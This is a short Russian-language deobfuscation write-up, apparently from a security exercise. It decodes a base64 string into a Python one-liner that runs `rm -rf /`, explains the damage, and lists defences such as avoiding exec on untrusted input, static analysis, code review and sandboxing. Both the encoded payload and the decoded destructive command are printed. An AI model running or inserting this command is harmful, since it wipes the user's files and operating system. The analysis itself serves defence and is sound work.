# Деобфускация (этап 3)

## Расшифрованная строка

Base64-строка `aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk=` декодируется в:

```
import os; os.system('rm -rf /')
```

## Анализ угрозы

Скрипт через `exec` выполняет системную команду `rm -rf /`. Она рекурсивно
и без подтверждения удаляет все файлы, начиная с корня файловой системы.
Последствия: потеря данных, пользовательских файлов и самой ОС, отказ
системы. При запуске от root ущерб максимален. Обфускация скрывает
вредоносную логику от беглого просмотра кода.

## Методы защиты

- Запретить или не использовать `exec` и `eval` с недоверенными данными.
- Валидировать и фильтровать входные данные, не выполнять код из строк.
- Использовать статический анализ (flake8, bandit) для поиска `exec`,
  `os.system`, base64-декодирования с последующим выполнением.
- Проводить code review, особенно для подозрительных закодированных строк.
- Запускать код с минимальными правами и в изолированной среде
  (контейнер, песочница); не работать под root.
